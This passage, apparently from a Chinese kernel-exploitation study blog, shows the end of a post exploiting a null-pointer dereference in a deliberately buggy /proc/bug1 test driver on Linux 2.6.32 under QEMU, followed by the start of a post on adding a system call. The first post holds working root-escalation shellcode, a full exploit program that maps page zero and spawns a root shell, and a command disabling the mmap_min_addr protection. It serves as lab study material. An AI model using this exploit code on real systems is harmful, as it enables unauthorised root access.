class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">write(fd, <span class="string">&quot;0x9k&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$ gcc -<span class="keyword">static</span> -o null_dereference_exp null_dereference_exp.c</span><br></pre></td></tr></table></figure><blockquote><p>qemuè°ƒè¯•åœ¨0åœ°å€å¤„ä¸‹æ–­ç‚¹</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨qemu</span><br><span class="line">$ qemu-system-i386 -S -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br><span class="line"></span><br><span class="line">åœ¨qemuä¸­æŒ‰ä½Ctrlï¼‹Altï¼‹2</span><br><span class="line">$ gdbserver tcp::1234</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/697a6d600f0a6455.jpg" class="gallery-item"><img src="http://i1.piimg.com/567571/697a6d600f0a6455.jpg"></a><br>linux å†…æ ¸ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä¸»æœºä¸­å¯åŠ¨gdb,å¹¶é“¾æ¥qemuå¹¶è®¾ç½®æ–­ç‚¹</span><br><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote localhost:1234</span><br><span class="line">gdb-peda$ b *0x0</span><br><span class="line">gdb-peda$ c</span><br><span class="line"></span><br><span class="line">åœ¨qemuä¸­æŒ‰ä½Ctrl+Alt+1åˆ‡æ¢åˆ°è¿è¡ŒçŠ¶æ€</span><br></pre></td></tr></table></figure><p><a href="http://i4.buimg.com/567571/bf793c7cb4edb01b.png" class="gallery-item"><img src="http://i4.buimg.com/567571/bf793c7cb4edb01b.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿è¡Œpoc</span><br><span class="line">$ ./poc</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥usrç›®å½•ï¼ŒæŒ‚è½½é©±åŠ¨åè¿è¡Œpocç¨‹åºã€‚<br><a href="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" class="gallery-item"><img src="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png"></a><br><a href="http://i1.piimg.com/567571/d4b0b3e61d7fc12c.png" class="gallery-item"><img src="http://i1.piimg.com/567571/d4b0b3e61d7fc12c.png"></a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»™å½“å‰è¿›ç¨‹èµ‹äºˆrootæƒé™</span><br><span class="line">commit_creds(prepare_kernel_cred(0));</span><br></pre></td></tr></table></figure><h3 id="å®ç°æ–¹æ³•-1-é€šç”¨è·å–"><a href="#å®ç°æ–¹æ³•-1-é€šç”¨è·å–" class="headerlink" title="å®ç°æ–¹æ³• 1 é€šç”¨è·å–"></a>å®ç°æ–¹æ³• 1 é€šç”¨è·å–</h3><p>K0 å¸ˆå‚…å‘Šè¯‰æˆ‘äº†ä¸€ä¸ªå§¿åŠ¿ï¼Œå¯ä»¥é€šç”¨ææƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);</span><br><span class="line">typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);</span><br><span class="line"> </span><br><span class="line">_commit_creds commit_creds &#x3D; (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred &#x3D; (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"> </span><br><span class="line">void get_root_payload(void) &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å†…å­˜é‡Œæ‰¾åˆ°commit credså’Œprepare kernel cred è¿™ä¸¤ä¸ªå‡½æ•°åœ°å€ç„¶åå°±ç›´æ¥å†™åœ¨ä¸€ä¸ªå‡½æ•°é‡Œåˆ°æ¼æ´è§¦å‘çš„æ—¶å€™ï¼Œç›´æ¥å¼•ç”¨è¿™ä¸ªå‡½æ•°åœ°å€å°±å¯ä»¥ææƒäº†</p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•çš„ä½¿ç”¨æ–¹æ³• 2 å³å¯c</p><h3 id="å®ç°æ–¹æ³•-2-ç®€å•çš„å–å¾—commit-credsã€prepare-kernel-credåœ°å€"><a href="#å®ç°æ–¹æ³•-2-ç®€å•çš„å–å¾—commit-credsã€prepare-kernel-credåœ°å€" class="headerlink" title="å®ç°æ–¹æ³• 2  ç®€å•çš„å–å¾—commit_credsã€prepare_kernel_credåœ°å€"></a>å®ç°æ–¹æ³• 2  ç®€å•çš„å–å¾—commit_credsã€prepare_kernel_credåœ°å€</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep commit_creds /proc/kallsyms</span><br><span class="line">$ grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure><p><a href="http://i2.muimg.com/567571/187cbbe3fbce5987.png" class="gallery-item"><img src="http://i2.muimg.com/567571/187cbbe3fbce5987.png"></a></p><h3 id="è®¾ç½®payload"><a href="#è®¾ç½®payload" class="headerlink" title="è®¾ç½®payload"></a>è®¾ç½®payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">æ±‡ç¼–å¯¹åº”çš„payload</span><br><span class="line">xor %eax,%eax</span><br><span class="line">call 0xc10680d0</span><br><span class="line">call 0xc1067f30</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¼–è¯‘ä¸Šè¿°æ±‡ç¼–</span><br><span class="line">$ gcc -o payload payload.s -nostdlib -Ttext&#x3D;0 </span><br><span class="line"></span><br><span class="line">å¾—åˆ°payloadçš„æœºå™¨ç </span><br><span class="line">$ objdump -d payload</span><br><span class="line">payloadï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;__bss_start-0x100d&gt;:</span><br><span class="line">   0:31 c0                xor    %eax,%eax</span><br><span class="line">   2:e8 c9 80 06 c1       call   c10680d0 &lt;_end+0xc10670c0&gt;</span><br><span class="line">   7:e8 24 7f 06 c1       call   c1067f30 &lt;_end+0xc1066f20&gt;</span><br><span class="line">   c:c3                   ret   </span><br><span class="line"></span><br><span class="line">payloadæœºå™¨ç </span><br><span class="line">$ \x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3</span><br></pre></td></tr></table></figure><h3 id="æœ€ç»ˆçš„exp"><a href="#æœ€ç»ˆçš„exp" class="headerlink" title="æœ€ç»ˆçš„exp"></a>æœ€ç»ˆçš„exp</h3><p>æˆ‘ä»¬éœ€è¦åˆ†é…0åœ°å€ç©ºé—´ç„¶åæ”¾å…¥shellcodeï¼Œç„¶åjmpè¿‡å»æ‰§è¡Œshellcodeï¼Œä½¿å½“å‰è¿›ç¨‹æœ‰rootæƒé™ï¼Œç„¶åæ‰§è¡Œä¸€ä¸ªsystem(â€œ/bin/shâ€);åœ¨ç¨‹åºè¿”å›ç”¨æˆ·æ€ä¹‹åæ‹¿åˆ°ä¸€ä¸ªrootçš„shellã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ vim <span class="built_in">exp</span>.c</span><br><span class="line">$ cat <span class="built_in">exp</span>.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">&quot;wing&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc -<span class="keyword">static</span> -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•exp"><a href="#æµ‹è¯•exp" class="headerlink" title="æµ‹è¯•exp"></a>æµ‹è¯•exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./exp</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/984a5526d03f5df1.png" class="gallery-item"><img src="http://i1.piimg.com/567571/984a5526d03f5df1.png"></a></p><blockquote><p>å›¾ä¸­å‡æ˜¯#ä¸æ˜¯<code>$</code>ï¼Œä½†æ˜¯ä»gdbä¸­å¯ä»¥çœ‹åˆ°payloadå·²ç»æ‰§è¡Œï¼Œæ‰€ä»¥å¦‚æœæ˜¯æ™®é€šç”¨æˆ·çš„è¯ï¼Œæ˜¯å¯ä»¥æ‹¿åˆ°root shellï¼Œå½“ç„¶æ˜¯åœ¨0åœ°å€å¯ä»¥mmapæƒ…å†µä¸‹ã€‚<br>mmap_min_addrç¦æ­¢ç”¨æˆ·æ˜ å°„ä½åœ°å€ã€‚</p></blockquote><h2 id="qemuä¸­æ·»åŠ æ™®é€šç”¨æˆ·å¹¶æµ‹è¯•"><a href="#qemuä¸­æ·»åŠ æ™®é€šç”¨æˆ·å¹¶æµ‹è¯•" class="headerlink" title="qemuä¸­æ·»åŠ æ™®é€šç”¨æˆ·å¹¶æµ‹è¯•"></a>qemuä¸­æ·»åŠ æ™®é€šç”¨æˆ·å¹¶æµ‹è¯•</h2><blockquote><p>ä½¿ç”¨adduseræ·»åŠ ç”¨æˆ·</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser wing</span><br></pre></td></tr></table></figure><blockquote><p>read-only file system è§£å†³åŠæ³•</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„remount, rwä¹‹é—´éœ€è¦ç©ºæ ¼</span><br><span class="line"><span class="comment"># mount -o remount, rw /   </span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># adduser wing</span><br><span class="line">adduser : &#x2F;etc&#x2F;group: No such file or directory</span><br><span class="line">adduser : &#x2F;home&#x2F;wing: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>è§£å†³åŠæ³•:touchå¯¹åº”çš„æ–‡ä»¶ï¼Œå¹¶å»ºç«‹ç›¸å…³çš„ç›®å½•</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># touch /etc/group</span></span><br><span class="line"><span class="comment"># touch /etc/passwd</span></span><br><span class="line"><span class="comment"># touch /etc/shadow</span></span><br><span class="line"><span class="comment"># mkdir -p /home/wing</span></span><br><span class="line"><span class="comment"># adduser wing</span></span><br><span class="line">adduser : use <span class="string">&#x27;wing&#x27;</span> <span class="keyword">in</span> use</span><br></pre></td></tr></table></figure><blockquote><p>åˆ‡æ¢æˆå¯¹åº”çš„æ™®é€šç”¨æˆ·å¹¶è¿è¡Œexp,è¿è¡Œè¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sysctl -w vm.mmap_min_addr=&quot;0&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>åˆ†æåŸå› (å›¾exp-error-reason)å‘ç°æ˜¯åœ¨mmapä¹‹åå‡ºé”™ éƒ½æ²¡èµ°åˆ°0åœ°å€å¤„,2.6.32å†…æ ¸å·²ç»ä½¿ç”¨mmap_min_addrä½œä¸ºç¼“è§£æªæ–½mmap_min_addrä¸º4096ï¼Œéœ€è¦è®¾ç½®ä¸‹mmap_min_addr</p></blockquote><blockquote><p>è®¾ç½®å®Œæˆä¹‹åï¼Œé‡æ–°è¿è¡Œexpå³å¯å¾—åˆ°root shell<br><a href="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" class="gallery-item"><img src="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png"></a></p></blockquote><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p>Jokerâ€˜ markdown<br><a href="http://bobao.360.cn/learning/detail/3702.html">ã€ç³»åˆ—åˆ†äº«ã€‘Linux å†…æ ¸æ¼æ´åˆ©ç”¨æ•™ç¨‹ï¼ˆäºŒï¼‰ï¼šä¸¤ä¸ªDemo</a><br><a href="https://beyermatthias.de/blog/2016/11/01/setup-for-linux-kernel-dev-using-qemu/">Setup for linux kernel dev using qemu</a><br><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf">linux_kernel_exploit</a></p><p><a href="https://wiki.debian.org/mmap_min_addr">mmap_min_addr - Debian Wiki</a></p><h2 id="ç”¨åˆ°çš„payloadè½¬æ¢è„šæœ¬"><a href="#ç”¨åˆ°çš„payloadè½¬æ¢è„šæœ¬" class="headerlink" title="ç”¨åˆ°çš„payloadè½¬æ¢è„šæœ¬"></a>ç”¨åˆ°çš„payloadè½¬æ¢è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   0:31 c0                xor    %eax,%eax</span></span><br><span class="line"><span class="string">   2:e8 b9 7f 06 c1       call   c1067fc0 &lt;_end+0xc1066f94&gt;</span></span><br><span class="line"><span class="string">   7:e8 14 7e 06 c1       call   c1067e20 &lt;_end+0xc1066df4&gt;</span></span><br><span class="line"><span class="string">   c:81 ec 00 01 00 00    sub    $0x100,%esp</span></span><br><span class="line"><span class="string">  12:50                   push   %eax</span></span><br><span class="line"><span class="string">  13:50                   push   %eax</span></span><br><span class="line"><span class="string">  14:68 2f 73 68 00       push   $0x68732f</span></span><br><span class="line"><span class="string">  19:68 2f 62 69 6e       push   $0x6e69622f</span></span><br><span class="line"><span class="string">  1e:89 e1                mov    %esp,%ecx</span></span><br><span class="line"><span class="string">  20:16                   push   %ss</span></span><br><span class="line"><span class="string">  21:51                   push   %ecx</span></span><br><span class="line"><span class="string">  22:9c                   pushf</span></span><br><span class="line"><span class="string">  23:0e                   push   %cs</span></span><br><span class="line"><span class="string">  24:68 5c 71 44 c1       push   $0xc144715c</span></span><br><span class="line"><span class="string">  29:cf                   iret&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">&quot; &#123;2,&#125;&quot;</span>,re.S)</span><br><span class="line">payload_all = <span class="string">&quot;&quot;</span></span><br><span class="line">lines = payload.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    text,_= pattern.subn(<span class="string">&quot;&quot;</span>,line.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    payload1 = <span class="string">&quot;\\x&quot;</span> + text.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;\\x&quot;</span>)</span><br><span class="line">    payload_all += payload1</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload_all</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (2)---æ·»åŠ ç³»ç»Ÿè°ƒç”¨</title>
      <link href="add-a-system-call.html"/>
      <url>add-a-system-call.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨"><a href="#æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨"></a>æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨</h1><h2 id="æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ–‡ä»¶"><a href="#æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ–‡ä»¶" class="headerlink" title="æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ–‡ä»¶"></a>æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/linux_kernel/linux-2.6.32.1/</span><br><span class="line">$  mkdir swing_test</span><br><span class="line">$ <span class="built_in">cd</span> swing_test</span><br><span class="line">$ cat swing_test.c</span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line">asmlinkage long sys_swing_test(int arg0)&#123;</span><br><span class="line">    printk(<span class="string">&quot;I am syscall&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;syscall arg %d&quot;</span>,arg0);</span><br><span class="line">    <span class="built_in">return</span> ((long)arg0);</span><br><span class="line">&#125;</span><br><span class="line">asmlinkage long sys_hello(void)&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello my kernel world\n&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat Makefile</span><br><span class="line"><span class="comment">#Makefile start</span></span><br><span class="line">obj-y := joker_test.o</span><br><span class="line"><span class="comment">#Makefile end</span></span><br><span class="line"></span><br><span class="line">ä¿®æ”¹linux-2.6.32.1æ ¹ç›®å½•ä¸‹çš„Makefile</span><br><span class="line"><span class="variable">$vim</span> ~/linux_kernel/linux-2.6.32.1/Makefile</span><br><span class="line">core-y        += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ joker_test/</span><br></pre></td></tr></table></figure><p><a href="http://i4.buimg.com/567571/a965e1c9a1970dd3.png" class="gallery-item"><img src="http://i4.buimg.com/567571/a965e1c9a1970dd3.png"></a> æ·»åŠ æµ‹è¯•ç›®å½•</p><h2 id="ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨"><a href="#ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨"></a>ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim arch/x86/kernel/syscall_table_32.S</span><br><span class="line">.long sys_swing_test            /* 337 */</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å¤´æ–‡ä»¶"><a href="#ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å¤´æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å¤´æ–‡ä»¶"></a>ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å¤´æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim ./arch/x86/include/asm/unistd_32.h</span><br><span class="line"><span class="comment">#define __NR_swing_test         337</span></span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ åº“æ–‡ä»¶æ–¹ä¾¿æµ‹è¯•æ–°çš„ç³»ç»Ÿè°ƒç”¨æ¥å£"><a href="#æ·»åŠ åº“æ–‡ä»¶æ–¹ä¾¿æµ‹è¯•æ–°çš„ç³»ç»Ÿè°ƒç”¨æ¥å£" class="headerlink" title="æ·»åŠ åº“æ–‡ä»¶æ–¹ä¾¿æµ‹è¯•æ–°çš„ç³»ç»Ÿè°ƒç”¨æ¥å£"></a>æ·»åŠ åº“æ–‡ä»¶æ–¹ä¾¿æµ‹è¯•æ–°çš„ç³»ç»Ÿè°ƒç”¨æ¥å£</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">åœ¨linux kernelæºç æ ¹ç›®å½•</span><br><span class="line">$ mkdir swing_test_syscall_lib</span><br><span class="line">$ vim swing_test_syscall_lib.c</span><br><span class="line">$ cat swing_test_syscall_lib.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _swing_test_ 337</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n Diving to kernel level\n\n&quot;</span>);</span><br><span class="line">syscall(_swing_test_,<span class="number">1234</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nRising to user level\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc swing_test_syscall_lib joker_test_syscall_lib.c -o swing_test_sycall -<span class="built_in">stack</span></span><br></pre></td></tr></table></figure><p>ç”±äºç¼–è¯‘çš„å†…æ ¸ä¸­ï¼Œåªæœ‰ä¸‹é¢çš„busyboxæ–‡ä»¶ç³»ç»Ÿç¼ºå°‘å¿…è¦çš„cåº“ç­‰ä¿¡æ¯ï¼Œéœ€è¦æŠŠä¸Šè¿°çš„æµ‹è¯•æ–‡ä»¶ä½¿ç”¨é™æ€ç¼–è¯‘çš„æ–¹å¼</p><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><p><code>make</code></p><h2 id="ç¼–è¯‘busybox"><a href="#ç¼–è¯‘busybox" class="headerlink" title="ç¼–è¯‘busybox"></a>ç¼–è¯‘busybox</h2><h2 id="busyboxå†…æ ¸ä¸‹è½½"><a href="#busyboxå†…æ ¸ä¸‹è½½" class="headerlink" title="busyboxå†…æ ¸ä¸‹è½½"></a><a href="https://busybox.net/downloads/">busyboxå†…æ ¸ä¸‹è½½</a></h2><p>æˆ‘è¿™é‡Œç”¨çš„å’Œå¸ˆå‚…ä»¬éƒ½ä¸ä¸€æ · æˆ‘ç”¨çš„æ˜¯busybox-1.22.1 ç‰ˆæœ¬</p><h3 id="ç¼–è¯‘é¡ºåº"><a href="#ç¼–è¯‘é¡ºåº" class="headerlink" 